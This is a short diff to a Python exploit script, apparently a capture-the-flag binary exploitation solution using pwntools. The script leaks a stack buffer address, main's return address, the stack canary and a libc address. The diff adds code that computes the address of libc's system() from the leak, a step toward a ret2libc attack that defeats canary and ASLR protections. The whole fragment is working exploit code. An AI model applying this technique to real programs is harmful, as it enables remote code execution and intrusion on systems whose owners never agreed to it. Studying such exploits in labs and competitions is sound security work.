@@ -79,6 +79,9 @@ def leak_canary(r, buffer):
     r.recvrepeat(timeout=0.2)
     return canary
 
+def compute_system(libc_leak):
+   return libc_leak & 0xfffffffffff00000 | 0x0000000000050d60
+
 def leak_libc(r, buffer, canary, sRIP):
     r.sendline(b"0")
     time.sleep(0.2)
@@ -130,8 +133,10 @@ buffer = leak_buffer(r)
 sRIP_main = leak_sRIP_main(r)
 canary = leak_canary(r, buffer)
 sRIP_libc = leak_libc(r, buffer, canary, sRIP_main)
+libc_system = compute_system(sRIP_libc)
 print("buffer:\t", hex(buffer))
 print("sRIP:\t", hex(sRIP_main))
 print("canary:\t", hex(canary))
 print("sRIP_libc:\t", hex(sRIP_libc))
+print("libc_system:\t", hex(libc_system))
 r.interactive()
